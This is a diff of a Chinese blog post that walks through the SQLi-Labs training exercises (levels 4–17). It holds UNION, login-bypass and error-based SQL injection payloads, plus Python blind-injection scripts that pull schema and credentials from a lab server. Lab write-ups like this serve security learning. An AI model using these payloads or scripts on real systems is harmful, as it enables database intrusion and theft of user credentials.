@@ -58,20 +58,20 @@
         <header>
     <nav class="navbar">
         <div class="container">
-            <div class="navbar-header header-logo"><a href="/">Lethe&#39;s Blog</a></div>
+            <div class="navbar-header header-logo"><font face="Comic Sans MS"><a href="/">Lethe&#39;s Blog</a></font></div>
             <div class="menu navbar-right">
                 
-                    <a class="menu-item" href="/archives">Posts</a>
+                    <font face="Comic Sans MS"><a class="menu-item" href="/archives">Posts</a>
                 
-                    <a class="menu-item" href="/category">Categories</a>
+                    <font face="Comic Sans MS"><a class="menu-item" href="/category">Categories</a>
                 
-                    <a class="menu-item" href="/tag">Tags</a>
+                    <font face="Comic Sans MS"><a class="menu-item" href="/tag">Tags</a>
                 
-                    <a class="menu-item" href="/about">About</a>
+                    <font face="Comic Sans MS"><a class="menu-item" href="/about">About</a>
                 
                 <input id="switch_default" type="checkbox" class="switch_default">
                 <label for="switch_default" class="toggleBtn"></label>
-            </div>
+            </font></font></font></font></div>
         </div>
     </nav>
 
@@ -80,7 +80,7 @@
         <div class="container">
             <div class="navbar-header">
                 <div>
-                    <b><a href="/">Lethe&#39;s Blog</a><a id="mobile-toggle-theme">·&nbsp;Light</a></b>
+                    <a href="/">Lethe&#39;s Blog</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
                 </div>
                 <div class="menu-toggle" onclick="mobileBtn()">&#9776; Menu</div>
             </div>
@@ -188,12 +188,12 @@
             
                 <div class="post-meta">
                     
-                        Author: <a itemprop="author" rel="author" href="/">Lethe</a>
+                        Author: <a itemprop="author" rel="author" href="/">Lethe</a>&ensp;
                     
 
                     
                         <span class="post-time">
-                        Date: <a href="#">July 26, 2019&nbsp;&nbsp;21:53:40</a>
+                        Date: <a href="#">July 26, 2019&nbsp;&nbsp;21:53:40</a>&ensp;
                         </span>
                     
                     
@@ -223,30 +223,9 @@
 <h4 id="Less-4"><a href="#Less-4" class="headerlink" title="Less-4"></a>Less-4</h4><p>区别是这里用<code>&quot;)</code>进行闭合</p>
 <p>最终payload：<br><code>?id=-1&quot;) union select 1,(select group_concat(username) from users),(select group_concat(password) from users)%23</code></p>
 <p><br></p>
-<h4 id="Less-5"><a href="#Less-5" class="headerlink" title="Less-5"></a>Less-5</h4><p>发现有回显”You are in………..”和不回显两种情况</p>
-<pre><code>?id=1&#39; and 1=1%23   You are in...........
-?id=1&#39; and 1=2%23  不回显
-</code></pre><p>判断为盲注，这里可以直接用sqlmap跑出来，但为了学习，还是自己写个脚本吧！</p>
-<p>脚本如下，只跑了一下库名，其他的类似，改一下payload即可：</p>
-<pre><code class="python"># bool-base script
-# auther：Lethe
-
-import requests
-s = requests.Session()
-url = &#39;http://43.247.91.228:84/Less-5/&#39;
-payloads = &#39;QqWwEeRrTtYyUuIiOoPpAaSsDdFfGgHhJjKkLlZzXxCcVvBbNnMm{},_&#39;
-data = &#39;&#39;
-
-for i in range(50):
-    for j in payloads:
-        # payload = f&quot;?id=1&#39; and substr(binary database(),{i},1)=&#39;{j}&#39;%23&quot;
-        # payload = f&quot;?id=1&#39; and substr((select binary group_concat(table_name) from information_schema.tables where table_schema=database()) ,{i},1)=&#39;{j}&#39;%23&quot;
-        payload = f&quot;?id=1&#39; and substr((select binary group_concat(column_name) from information_schema.columns where table_name=&#39;users&#39;) ,{i},1)=&#39;{j}&#39;%23&quot; 
-        if &quot;You are in...........&quot; in s.get(url+payload).text:
-            data += j
-            break
-    print(data)
-</code></pre>
+<h4 id="Less-5"><a href="#Less-5" class="headerlink" title="Less-5"></a>Less-5</h4><p>发现有回显”You are in………..”和不回显两种情况<br><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?<span class="attribute">id</span>=1' <span class="keyword">and</span> <span class="attribute">1</span>=1%23   You are <span class="keyword">in</span><span class="built_in">..</span><span class="built_in">..</span><span class="built_in">..</span><span class="built_in">..</span><span class="built_in">..</span>.</span><br><span class="line">?<span class="attribute">id</span>=1' <span class="keyword">and</span> <span class="attribute">1</span>=2%23  不回显</span><br></pre></td></tr></table></figure></p>
+<p>判断为盲注，这里可以直接用sqlmap跑出来，但为了学习，还是自己写个脚本吧！</p>
+<p>脚本如下，只跑了一下库名，其他的类似，改一下payload即可：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># bool-base script</span></span><br><span class="line"><span class="comment"># auther：Lethe</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">s = requests.Session()</span><br><span class="line">url = <span class="string">'http://43.247.91.228:84/Less-5/'</span></span><br><span class="line">payloads = <span class="string">'QqWwEeRrTtYyUuIiOoPpAaSsDdFfGgHhJjKkLlZzXxCcVvBbNnMm&#123;&#125;,_'</span></span><br><span class="line">data = <span class="string">''</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">50</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> payloads:</span><br><span class="line">        <span class="comment"># payload = f"?id=1' and substr(binary database(),&#123;i&#125;,1)='&#123;j&#125;'%23"</span></span><br><span class="line">        <span class="comment"># payload = f"?id=1' and substr((select binary group_concat(table_name) from information_schema.tables where table_schema=database()) ,&#123;i&#125;,1)='&#123;j&#125;'%23"</span></span><br><span class="line">        payload = <span class="string">f"?id=1' and substr((select binary group_concat(column_name) from information_schema.columns where table_name='users') ,<span class="subst">&#123;i&#125;</span>,1)='<span class="subst">&#123;j&#125;</span>'%23"</span> </span><br><span class="line">        <span class="keyword">if</span> <span class="string">"You are in..........."</span> <span class="keyword">in</span> s.get(url+payload).text:</span><br><span class="line">            data += j</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    print(data)</span><br></pre></td></tr></table></figure></p>
 <p><br></p>
 <h4 id="Less-6"><a href="#Less-6" class="headerlink" title="Less-6"></a>Less-6</h4><p>同样是bool盲注，双引号报错，判断为双引号闭合，将less-5的脚本中payload的单引号改为双引号即可。<br><br></p>
 <h4 id="Less-7"><a href="#Less-7" class="headerlink" title="Less-7"></a>Less-7</h4><p>测试发现<code>id=1&#39;</code>报错，但把后面的语句注释掉扔报错，还有括号闭合，发现加两个括号判断为<code>((&#39;$id&#39;))</code>闭合。<br>根据提示Use outfile……，应该是具有导出什么的了。</p>
@@ -258,60 +237,12 @@ for i in range(50):
 <h4 id="Less-8"><a href="#Less-8" class="headerlink" title="Less-8"></a>Less-8</h4><p>单引号闭合的盲注，用less-5的脚本跑一下即可。<br><br></p>
 <h4 id="Less-9"><a href="#Less-9" class="headerlink" title="Less-9"></a>Less-9</h4><p>发现页面无论对错都只回显<code>You are in...........</code></p>
 <p>测试<code>?id=1&#39; and sleep(3)%23</code> 页面会延时3秒再回显，判断为时间盲注</p>
-<p>脚本如下：</p>
-<pre><code class="python"># less-9 time-base script
-# auther：Lethe
-
-import requests
-
-url = &#39;http://43.247.91.228:84/Less-9/&#39;
-
-payloads = &#39;QqWwEeRrTtYyUuIiOoPpAaSsDdFfGgHhJjKkLlZzXxCcVvBbNnMm{},_&#39;
-
-data = &#39;&#39;
-
-for i in range(50):
-    for j in payloads:
-        # payload = f&quot;?id=1&#39; and if((substr(binary database(),{i},1)=&#39;{j}&#39;),sleep(2),1)%23&quot;
-        # payload = f&quot;?id=1&#39; and if((substr((select binary group_concat(table_name) from information_schema.tables where table_schema=database()) ,{i},1)=&#39;{j}&#39;),sleep(2),1)%23&quot;
-        payload = f&quot;?id=1&#39; and if((substr((select binary group_concat(column_name) from information_schema.columns where table_name=&#39;users&#39;) ,{i},1)=&#39;{j}&#39;),sleep(2),1)%23&quot; 
-        try:
-            r = requests.get(url+payload, timeout=1)
-        except Exception:
-            data += j
-            print(data)
-            break       
-</code></pre>
+<p>脚本如下：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># less-9 time-base script</span></span><br><span class="line"><span class="comment"># auther：Lethe</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">'http://43.247.91.228:84/Less-9/'</span></span><br><span class="line"></span><br><span class="line">payloads = <span class="string">'QqWwEeRrTtYyUuIiOoPpAaSsDdFfGgHhJjKkLlZzXxCcVvBbNnMm&#123;&#125;,_'</span></span><br><span class="line"></span><br><span class="line">data = <span class="string">''</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">50</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> payloads:</span><br><span class="line">        <span class="comment"># payload = f"?id=1' and if((substr(binary database(),&#123;i&#125;,1)='&#123;j&#125;'),sleep(2),1)%23"</span></span><br><span class="line">        <span class="comment"># payload = f"?id=1' and if((substr((select binary group_concat(table_name) from information_schema.tables where table_schema=database()) ,&#123;i&#125;,1)='&#123;j&#125;'),sleep(2),1)%23"</span></span><br><span class="line">        payload = <span class="string">f"?id=1' and if((substr((select binary group_concat(column_name) from information_schema.columns where table_name='users') ,<span class="subst">&#123;i&#125;</span>,1)='<span class="subst">&#123;j&#125;</span>'),sleep(2),1)%23"</span> </span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            r = requests.get(url+payload, timeout=<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">except</span> Exception:</span><br><span class="line">            data += j</span><br><span class="line">            print(data)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure></p>
 <p><br></p>
 <h4 id="Less-10"><a href="#Less-10" class="headerlink" title="Less-10"></a>Less-10</h4><p>双引号闭合的时间盲注。</p>
-<p>稍微改一下less-9的脚本即可：</p>
-<pre><code class="python"># less-10 script
-# auther：Lethe
-
-import requests
-
-url = &#39;http://43.247.91.228:84/Less-10/&#39;
-
-payloads = &#39;QqWwEeRrTtYyUuIiOoPpAaSsDdFfGgHhJjKkLlZzXxCcVvBbNnMm{},_&#39;
-
-data = &#39;&#39;
-
-for i in range(50):
-    for j in payloads:
-        # payload = f&quot;?id=1\&quot; and if((substr(binary database(),{i},1)=&#39;{j}&#39;),sleep(2),1)%23&quot;
-        # payload = f&quot;?id=1\&quot; and if((substr((select binary group_concat(table_name) from information_schema.tables where table_schema=database()) ,{i},1)=&#39;{j}&#39;),sleep(2),1)%23&quot;
-        payload = f&quot;?id=1\&quot; and if((substr((select binary group_concat(column_name) from information_schema.columns where table_name=&#39;users&#39;) ,{i},1)=&#39;{j}&#39;),sleep(2),1)%23&quot; 
-        try:
-            r = requests.get(url+payload, timeout=1)
-        except Exception:
-            data += j
-            print(data)
-            break            
-</code></pre>
+<p>稍微改一下less-9的脚本即可：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># less-10 script</span></span><br><span class="line"><span class="comment"># auther：Lethe</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">'http://43.247.91.228:84/Less-10/'</span></span><br><span class="line"></span><br><span class="line">payloads = <span class="string">'QqWwEeRrTtYyUuIiOoPpAaSsDdFfGgHhJjKkLlZzXxCcVvBbNnMm&#123;&#125;,_'</span></span><br><span class="line"></span><br><span class="line">data = <span class="string">''</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">50</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> payloads:</span><br><span class="line">        <span class="comment"># payload = f"?id=1\" and if((substr(binary database(),&#123;i&#125;,1)='&#123;j&#125;'),sleep(2),1)%23"</span></span><br><span class="line">        <span class="comment"># payload = f"?id=1\" and if((substr((select binary group_concat(table_name) from information_schema.tables where table_schema=database()) ,&#123;i&#125;,1)='&#123;j&#125;'),sleep(2),1)%23"</span></span><br><span class="line">        payload = <span class="string">f"?id=1\" and if((substr((select binary group_concat(column_name) from information_schema.columns where table_name='users') ,<span class="subst">&#123;i&#125;</span>,1)='<span class="subst">&#123;j&#125;</span>'),sleep(2),1)%23"</span> </span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            r = requests.get(url+payload, timeout=<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">except</span> Exception:</span><br><span class="line">            data += j</span><br><span class="line">            print(data)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure></p>
 <p><br></p>
-<h4 id="Less-11"><a href="#Less-11" class="headerlink" title="Less-11"></a>Less-11</h4><p>是一个登录框，后端语句为:</p>
-<pre><code class="php">@$sql=&quot;SELECT username, password FROM users WHERE username=&#39;$uname&#39; and password=&#39;$passwd&#39; LIMIT 0,1&quot;;
-</code></pre>
+<h4 id="Less-11"><a href="#Less-11" class="headerlink" title="Less-11"></a>Less-11</h4><p>是一个登录框，后端语句为:<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">@$sql=<span class="string">"SELECT username, password FROM users WHERE username='$uname' and password='$passwd' LIMIT 0,1"</span>;</span><br></pre></td></tr></table></figure></p>
 <p>所有构造万能密码即可：<br>即Username为<code>1&#39; or 1=1#</code>，Password为任意值。</p>
 <p>因为这里是Post方式传到后端，因此注释符只能用<code>#</code><br><br></p>
 <h4 id="Less-12"><a href="#Less-12" class="headerlink" title="Less-12"></a>Less-12</h4><p>与上题的区别是这里用<code>(&quot;$uname&quot;)</code>进行闭合</p>
@@ -324,109 +255,32 @@ for i in range(50):
 <p>构造<code>1&#39; or 1=1#</code>即可登陆</p>
 <p>要想通过这个注入出数据，可以写个脚本，但这里回显的语句是图片，不好进行bool盲注，于是考虑时间盲注。</p>
 <p>发现构造：<code>1&#39; or sleep(3)#</code>页面会进行延时，所以脚本如下：</p>
-<pre><code class="python"># less-15
-# auther：Lethe
-
-import requests
-
-url = &#39;http://43.247.91.228:84/Less-15/&#39;
-
-payloads = &#39;QqWwEeRrTtYyUuIiOoPpAaSsDdFfGgHhJjKkLlZzXxCcVvBbNnMm{},_&#39;
-
-data = &#39;&#39;
-
-for i in range(50):
-    for j in payloads:
-        # payload = {&#39;uname&#39;:f&quot;1&#39; or if((substr(binary database(),{i},1)=&#39;{j}&#39;)  ,sleep(2),1)#   &quot; ,&#39;passwd&#39;:&#39;lethe&#39;,&#39;submit&#39;:&#39;Submit&#39;}
-        # payload = {&#39;uname&#39;:f&quot;1&#39; or if((substr((select binary group_concat(table_name) from information_schema.tables where table_schema=database()) ,{i},1)=&#39;{j}&#39;),sleep(2),1)#   &quot; ,&#39;passwd&#39;:&#39;lethe&#39;,&#39;submit&#39;:&#39;Submit&#39;}
-        payload = {&#39;uname&#39;:f&quot;1&#39; or if((substr((select binary group_concat(column_name) from information_schema.columns where table_name=&#39;users&#39;) ,{i},1)=&#39;{j}&#39;),sleep(2),1)#   &quot; ,&#39;passwd&#39;:&#39;lethe&#39;,&#39;submit&#39;:&#39;Submit&#39;}
-        try:
-            r = requests.post(url, data=payload, timeout=1)
-        except Exception:
-            data += j
-            print(data)
-            break
-</code></pre>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># less-15</span></span><br><span class="line"><span class="comment"># auther：Lethe</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">'http://43.247.91.228:84/Less-15/'</span></span><br><span class="line"></span><br><span class="line">payloads = <span class="string">'QqWwEeRrTtYyUuIiOoPpAaSsDdFfGgHhJjKkLlZzXxCcVvBbNnMm&#123;&#125;,_'</span></span><br><span class="line"></span><br><span class="line">data = <span class="string">''</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">50</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> payloads:</span><br><span class="line">        <span class="comment"># payload = &#123;'uname':f"1' or if((substr(binary database(),&#123;i&#125;,1)='&#123;j&#125;')  ,sleep(2),1)#   " ,'passwd':'lethe','submit':'Submit'&#125;</span></span><br><span class="line">        <span class="comment"># payload = &#123;'uname':f"1' or if((substr((select binary group_concat(table_name) from information_schema.tables where table_schema=database()) ,&#123;i&#125;,1)='&#123;j&#125;'),sleep(2),1)#   " ,'passwd':'lethe','submit':'Submit'&#125;</span></span><br><span class="line">        payload = &#123;<span class="string">'uname'</span>:<span class="string">f"1' or if((substr((select binary group_concat(column_name) from information_schema.columns where table_name='users') ,<span class="subst">&#123;i&#125;</span>,1)='<span class="subst">&#123;j&#125;</span>'),sleep(2),1)#   "</span> ,<span class="string">'passwd'</span>:<span class="string">'lethe'</span>,<span class="string">'submit'</span>:<span class="string">'Submit'</span>&#125;</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            r = requests.post(url, data=payload, timeout=<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">except</span> Exception:</span><br><span class="line">            data += j</span><br><span class="line">            print(data)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
 <p><br></p>
 <h4 id="Less-16"><a href="#Less-16" class="headerlink" title="Less-16"></a>Less-16</h4><p>将less-15中的闭合方式改为<code>(&quot;$uname&quot;)</code>即可，其他都一样。</p>
 <p><br></p>
-<h4 id="Less-17"><a href="#Less-17" class="headerlink" title="Less-17"></a>Less-17</h4><pre><code class="php">function check_input($value)
-    {
-    if(!empty($value))
-        {
-        // truncation (see comments)
-        $value = substr($value,0,15);
-        }
-
-        // Stripslashes if magic quotes enabled
-        if (get_magic_quotes_gpc())
-            {
-            $value = stripslashes($value);
-            }
-
-        // Quote if not a number
-        if (!ctype_digit($value))
-            {
-            $value = &quot;&#39;&quot; . mysql_real_escape_string($value) . &quot;&#39;&quot;;
-            }
-
-    else
-        {
-        $value = intval($value);
-        }
-    return $value;
-    }
-</code></pre>
-<p>这里用check_input函数对username的值进行了过滤，而对password没有限制，因此考虑构造password。<br>可利用只有Update语句：</p>
-<pre><code class="php">$update=&quot;UPDATE users SET password = &#39;$passwd&#39; WHERE username=&#39;$row1&#39;&quot;;
-</code></pre>
+<h4 id="Less-17"><a href="#Less-17" class="headerlink" title="Less-17"></a>Less-17</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check_input</span><span class="params">($value)</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(!<span class="keyword">empty</span>($value))</span><br><span class="line">		&#123;</span><br><span class="line">		<span class="comment">// truncation (see comments)</span></span><br><span class="line">		$value = substr($value,<span class="number">0</span>,<span class="number">15</span>);</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="comment">// Stripslashes if magic quotes enabled</span></span><br><span class="line">		<span class="keyword">if</span> (get_magic_quotes_gpc())</span><br><span class="line">			&#123;</span><br><span class="line">			$value = stripslashes($value);</span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">		<span class="comment">// Quote if not a number</span></span><br><span class="line">		<span class="keyword">if</span> (!ctype_digit($value))</span><br><span class="line">			&#123;</span><br><span class="line">			$value = <span class="string">"'"</span> . mysql_real_escape_string($value) . <span class="string">"'"</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">		&#123;</span><br><span class="line">		$value = intval($value);</span><br><span class="line">		&#125;</span><br><span class="line">	<span class="keyword">return</span> $value;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
+<p>这里用check_input函数对username的值进行了过滤，而对password没有限制，因此考虑构造password。<br>可利用只有Update语句：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$update=<span class="string">"UPDATE users SET password = '$passwd' WHERE username='$row1'"</span>;</span><br></pre></td></tr></table></figure></p>
 <p>所以利用报错注入，可以参考这篇文章：<a href="https://xz.aliyun.com/t/253" target="_blank" rel="noopener">Mysql报错注入总结</a></p>
 <p>主要的分为三种方法：</p>
 <ul>
-<li><p>BIGINT等数据类型溢出</p>
-<pre><code class="sql">mysql&gt; select (select(!x-~0)from(select(select user())x)a);
-ERROR 1690 (22003): BIGINT UNSIGNED value is out of range in &#39;((not(&#39;root@localhost&#39;)) - ~(0))&#39;
-</code></pre>
-<p>在mysql&gt;5.5.53时，则不能返回查询结果</p>
-</li>
-<li><p>xpath语法错误<br><code>`</code>sql<br>mysql&gt; select updatexml(1,concat(0x7e,(select @@version),0x7e),1);<br>ERROR 1105 (HY000): XPATH syntax error: ‘~5.7.17~’</p>
+<li>BIGINT等数据类型溢出<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select (select(!x-~0)from(select(select user())x)a);</span><br><span class="line">ERROR 1690 (22003): BIGINT UNSIGNED value is out of range in '((not('root@localhost')) - ~(0))'</span><br></pre></td></tr></table></figure>
 </li>
 </ul>
-<p>mysql&gt; select extractvalue(1,concat(0x7e,(select @@version),0x7e));<br>ERROR 1105 (HY000): XPATH syntax error: ‘~5.7.17~’</p>
-<pre><code>![在这里插入图片描述](SQLi-Labs通关笔记/20190720204335538.png)
-- concat+rand()+group_by()导致主键重复（floor()报错注入）
-
-
-```sql
-mysql&gt; select count(*) from information_schema.tables group by concat(version(),floor(rand(0)*2));
-ERROR 1062 (23000): Duplicate entry &#39;5.5.54-log1&#39; for key &#39;group_key&#39;
-
-mysql&gt; select count(*),concat(version(),floor(rand(0)*2))x from information_schema.tables group by x;
-ERROR 1062 (23000): Duplicate entry &#39;5.5.54-log1&#39; for key &#39;group_key&#39;
-
-mysql&gt; select 1 from(select count(*),concat(version(),floor(rand(0)*2))x from information_schema.tables group by x)a;
-ERROR 1062 (23000): Duplicate entry &#39;5.5.54-log1&#39; for key &#39;group_key&#39;
-</code></pre><p><img src="/2019/07/26/SQLi-Labs通关笔记/20190720212316599.png" alt="在这里插入图片描述"><br>这题我采用extractvalue报错，payload如下：</p>
-<pre><code>User Name: admin
-New Password : 1&#39; and extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e))#
-回显：XPATH syntax error: &#39;~emails,referers,uagents,users~&#39;
-
-User Name: admin
-New Password : 1&#39; and extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=&#39;users&#39;),0x7e))#
-回显：XPATH syntax error: &#39;~id,username,password~&#39;
-
-User Name: admin
-New Password : 1&#39; and extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=&#39;users&#39;),0x7e))#
-回显：XPATH syntax error: &#39;~id,username,password~&#39;
-</code></pre><p>接下来，当想要注出user表中的数据时，会报错：<code>You can&#39;t specify target table &#39;users&#39; for update in FROM clause</code>，因为在同一语句中，不能先select出同一表中的某些值，再update这个表。</p>
-<p>所以要通过子查询，使select的表更换一个名称。<br>payload:</p>
-<pre><code>User Name: admin
-New Password : 1&#39; and extractvalue(1,concat(0x7e,( select * from ( select group_concat(username,password) from users )a),0x7e))#
-回显：XPATH syntax error: &#39;~id,username,password~&#39;
-
-发现报错的信息字数有限，因此想要获得全部数据的化可以通过limit语句一条条的读:
-1&#39; and extractvalue(1,concat(0x7e,( select * from ( select concat_ws(&#39;:&#39;,username,password) from users limit 0,1)a),0x7e))#
-</code></pre><p><br></p>
+<p>在mysql&gt;5.5.53时，则不能返回查询结果</p>
+<ul>
+<li>xpath语法错误<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select updatexml(1,concat(0x7e,(select @@version),0x7e),1);</span><br><span class="line">ERROR 1105 (HY000): XPATH syntax error: '~5.7.17~'</span><br><span class="line"></span><br><span class="line">mysql&gt; select extractvalue(1,concat(0x7e,(select @@version),0x7e));</span><br><span class="line">ERROR 1105 (HY000): XPATH syntax error: '~5.7.17~'</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+<p><img src="/2019/07/26/SQLi-Labs通关笔记/20190720204335538.png" alt="在这里插入图片描述"></p>
+<ul>
+<li>concat+rand()+group_by()导致主键重复（floor()报错注入）</li>
+</ul>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select count(*) from information_schema.tables group by concat(version(),floor(rand(0)*2));</span><br><span class="line">ERROR 1062 (23000): Duplicate entry '5.5.54-log1' for key 'group_key'</span><br><span class="line"></span><br><span class="line">mysql&gt; select count(*),concat(version(),floor(rand(0)*2))x from information_schema.tables group by x;</span><br><span class="line">ERROR 1062 (23000): Duplicate entry '5.5.54-log1' for key 'group_key'</span><br><span class="line"></span><br><span class="line">mysql&gt; select 1 from(select count(*),concat(version(),floor(rand(0)*2))x from information_schema.tables group by x)a;</span><br><span class="line">ERROR 1062 (23000): Duplicate entry '5.5.54-log1' for key 'group_key'</span><br></pre></td></tr></table></figure>
+<p><img src="/2019/07/26/SQLi-Labs通关笔记/20190720212316599.png" alt="在这里插入图片描述"><br>这题我采用extractvalue报错，payload如下：<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">User Name: admin</span><br><span class="line">New Password : 1' and extractvalue(1,concat(0x7e,(<span class="keyword">select</span> <span class="keyword">group_concat</span>(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="keyword">database</span>()),<span class="number">0x7e</span>))<span class="comment">#</span></span><br><span class="line">回显：XPATH syntax <span class="keyword">error</span>: <span class="string">'~emails,referers,uagents,users~'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">User</span> <span class="keyword">Name</span>: <span class="keyword">admin</span></span><br><span class="line"><span class="keyword">New</span> <span class="keyword">Password</span> : <span class="number">1</span><span class="string">' and extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name='</span><span class="keyword">users</span><span class="string">'),0x7e))#</span></span><br><span class="line"><span class="string">回显：XPATH syntax error: '</span>~<span class="keyword">id</span>,username,<span class="keyword">password</span>~<span class="string">'</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">User Name: admin</span></span><br><span class="line"><span class="string">New Password : 1'</span> <span class="keyword">and</span> extractvalue(<span class="number">1</span>,<span class="keyword">concat</span>(<span class="number">0x7e</span>,(<span class="keyword">select</span> <span class="keyword">group_concat</span>(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name=<span class="string">'users'</span>),<span class="number">0x7e</span>))<span class="comment">#</span></span><br><span class="line">回显：XPATH syntax <span class="keyword">error</span>: <span class="string">'~id,username,password~'</span></span><br></pre></td></tr></table></figure></p>
